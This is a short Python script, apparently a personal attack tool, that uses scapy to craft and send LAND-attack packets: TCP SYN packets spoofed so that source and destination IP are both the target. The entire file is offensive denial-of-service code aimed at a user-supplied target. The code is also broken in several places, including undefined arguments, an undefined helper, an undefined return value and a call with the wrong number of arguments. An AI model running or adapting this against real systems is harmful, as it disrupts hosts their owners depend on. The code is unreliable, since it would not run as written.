# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> landbase.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/24 4:06

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

import argparse
import random
import uuid
from scapy.all import *


def get_parser():
    parser = argparse.ArgumentParser(description='Execute Land-Base attack.')
    parser.add_argument("-m", "--smac", type=str, metavar="[XX:XX:XX:XX:XX:XX]", help="Construct source MAC address.")
    parser.add_argument("-d", "--dst", type=str, metavar="[xxx.xxx.xxx.xxx]", help="Target IP address.")
    parser.add_argument("--hide-mac", action="store_true", help="Hide source MAC address.")
    parser.add_argument("-n", "--num", type=int, metavar="number", help="Number of packets sent.")
    parser.add_argument("-t", "--time", type=int, metavar="second", default=0, help="Time interval between sending request packets.")
    args = parser.parse_args()
    src = args.smac
    dst = args.dst
    num = args.num
    tim = args.time
    ver = ""
    if args.hide_src:
        src = hide_src_ip()
    if args.version:
        ver = "Version: v1.0"
    return smac, dst, num, tim, ver


def get_mac_address():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])


def crafting_packets( smac, target ):
    data_link_layer = Ether(
        src = smac
    )
    network_layer = IP(
        src = target,
        dst = target
    )
    transport_layer = TCP(
        sport = random.randint(1000, 65535),
        dport = random.randint(1000, 65535),
        flags = "S"
    )
    pkt = network_layer / transport_layer
    return pkt


def send_packers(pkt):
    send(pkt)


if __name__ == '__main__':
    target = input("input target: ")
    pkt = crafting_packets(target)
    pkt.show()
    send_packers(pkt)